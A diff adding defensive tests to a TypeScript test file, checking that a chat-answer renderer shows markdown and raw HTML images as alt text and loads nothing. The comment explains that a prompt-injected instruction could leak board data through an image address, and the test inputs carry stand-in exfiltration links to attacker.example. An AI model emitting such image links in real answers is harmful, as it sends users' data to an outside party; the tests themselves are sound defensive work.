@@ -198,6 +198,40 @@ describe('wrapping a path in inline code at a folder', () => {
   });
 });
 
+describe('an image in an answer', () => {
+  // An image's address is fetched when the answer paints, so an injected
+  // instruction could carry board data out in one with no click. The answer
+  // keeps the alt text and loads nothing.
+  //
+  // Red-green: drop the `img` override in KnowledgeGraphChatText and both
+  // markdown forms render an <img> whose src is the attacker's address.
+  const render = (text: string) => renderToStaticMarkup(createElement(KnowledgeGraphChatText, {
+    text,
+    tasksByTicket: new Map(),
+    onOpenTask: () => undefined,
+    canOpenTask: () => false,
+  }));
+
+  it('renders an inline image as its alt text and loads nothing', () => {
+    const markup = render('Done. ![board titles](https://attacker.example/collect?q=secret)');
+    expect(markup).not.toContain('<img');
+    expect(markup).not.toContain('attacker.example');
+    expect(markup).toContain('board titles');
+  });
+
+  it('renders a reference-style image as its alt text too', () => {
+    const markup = render('Done. ![pixel][ref]\n\n[ref]: https://attacker.example/p.png');
+    expect(markup).not.toContain('<img');
+    expect(markup).not.toContain('attacker.example');
+    expect(markup).toContain('pixel');
+  });
+
+  it('shows raw image markup as text, since no raw-HTML plugin is loaded', () => {
+    const markup = render('Done. <img src="https://attacker.example/raw.png">');
+    expect(markup).not.toContain('<img');
+  });
+});
+
 describe('stripping the protocol line', () => {
   it('removes a finished SELECTED line', () => {
     expect(stripProtocolLine('#378 cost the most.\nSELECTED: #378, #377')).toBe('#378 cost the most.');
